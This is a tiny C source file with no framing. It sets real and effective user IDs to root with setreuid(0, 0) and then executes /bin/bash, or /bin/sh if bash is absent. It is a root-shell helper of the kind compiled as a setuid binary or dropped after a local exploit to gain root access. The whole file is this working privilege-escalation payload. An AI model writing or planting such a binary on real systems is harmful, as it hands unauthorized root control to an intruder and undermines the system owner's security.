#include <stdlib.h>
#include <unistd.h>

void main(void){
	setreuid (0, 0);

	/* Check for availability of bash */
	if (access ("/bin/bash", F_OK) != -1) {
		execve ("/bin/bash", NULL, NULL);
	} else {
		execve ("/bin/sh", NULL, NULL);
	}
}
